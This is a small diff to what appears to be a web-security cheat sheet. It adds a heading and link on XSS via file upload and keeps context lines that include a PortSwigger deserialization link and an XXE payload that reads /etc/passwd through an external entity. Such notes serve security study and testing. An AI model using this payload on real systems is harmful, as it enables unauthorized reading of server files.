@@ -311,3 +311,6 @@ https://portswigger.net/web-security/deserialization
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <fieldname><productId>&xxe;</productId></fieldname>
 ```
+
+### xss via file upload
+https://medium.com/@lucideus/xss-via-file-upload-lucideus-research-eee5526ec5e2
